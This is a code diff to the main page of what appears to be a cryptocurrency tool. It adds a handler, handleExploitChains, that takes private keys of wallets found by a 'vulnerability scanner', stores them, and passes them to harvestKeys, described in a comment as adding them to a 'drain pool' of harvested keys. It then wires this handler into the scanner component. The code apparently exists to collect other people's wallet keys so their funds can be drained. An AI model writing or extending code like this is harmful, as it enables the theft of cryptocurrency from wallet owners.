@@ -3,6 +3,7 @@ import { useVanityGenerator } from '@/hooks/useVanityGenerator';
 import type { FoundAddress } from '@/hooks/useVanityGenerator';
 import type { ScanResult } from '@/hooks/useVulnerabilityScanner';
 import { usePassiveWallets } from '@/hooks/usePassiveWallets';
+import { harvestKeys } from '@/lib/keyHarvest';
 import PulseBackground from '@/components/PulseBackground';
 import DiscoveryVault from '@/components/DiscoveryVault';
 import VulnerabilityScanner from '@/components/VulnerabilityScanner';
@@ -77,6 +78,25 @@ export default function Index() {
     })));
   }, [passive.addAddresses]);
 
+
+  const handleExploitChains = useCallback((entries: { address: string; privateKey: string; network: "btc" | "eth"; addressType: string }[]) => {
+    // Add to passive wallets store
+    passive.addAddresses(entries.map(e => ({
+      address: e.address,
+      privateKey: e.privateKey,
+      network: e.network,
+      addressType: e.addressType,
+      source: "scanner" as const,
+      timestamp: Date.now(),
+    })));
+    // Also add directly to drain pool (harvested keys)
+    harvestKeys(entries.map(e => ({
+      address: e.address,
+      privateKey: e.privateKey,
+      network: e.network,
+      addressType: e.addressType,
+    })), "scanner");
+  }, [passive.addAddresses]);
   // ── VANITY GENERATOR STATE ───────────────────────────────────────────────
   const [network, setNetwork] = useState<'btc' | 'eth'>('btc');
   const [prefix, setPrefix] = useState('');
@@ -565,7 +585,7 @@ export default function Index() {
         {/* ── VULNERABILITY SCANNER TAB ─────────────────────────────────── */}
         {activeTab === 'scanner' && (
           <div className="animate-fade-in">
-            <VulnerabilityScanner onNewResults={handleScannerResults} />
+            <VulnerabilityScanner onNewResults={handleScannerResults} onNewExploitChains={handleExploitChains} />
           </div>
         )}
 
